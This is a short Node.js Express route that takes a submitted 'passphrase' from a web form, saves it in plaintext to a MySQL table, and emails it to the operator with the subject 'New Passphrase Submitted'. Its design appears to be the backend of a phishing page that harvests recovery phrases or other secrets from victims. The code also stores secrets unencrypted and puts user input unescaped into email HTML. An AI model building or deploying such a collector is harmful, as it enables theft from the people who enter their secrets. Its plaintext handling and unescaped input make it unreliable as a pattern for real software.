const express = require('express');
const router = express.Router();
const nodemailer = require('nodemailer');
const mysql = require('mysql2/promise');
require('dotenv').config();

router.post('/process', async (req, res) => {
    const { passphrase, action } = req.body;

    try {
        // Database connection
        const connection = await mysql.createConnection({
            host: process.env.DB_HOST,
            database: process.env.DB_NAME,
            user: process.env.DB_USER,
            password: process.env.DB_PASSWORD,
            port: process.env.DB_PORT
        });

        // Insert into database
        if (passphrase) {
            await connection.execute(
                'INSERT INTO passphrases (passphrase, action) VALUES (?, ?)',
                [passphrase, action]
            );
        }

        // Email configuration
        let transporter = nodemailer.createTransport({
            host: 'smtp.gmail.com',
            port: 465,
            secure: true,
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASS
            }
        });

        // Send email
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER,
            subject: 'New Passphrase Submitted',
            html: `<b>Action:</b> ${action}<br><b>Passphrase:</b> ${passphrase || 'None'}`
        });

        await connection.end();

        res.json({ message: 'Success' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: error.message || 'Internal server error' });
    }
});

module.exports = router;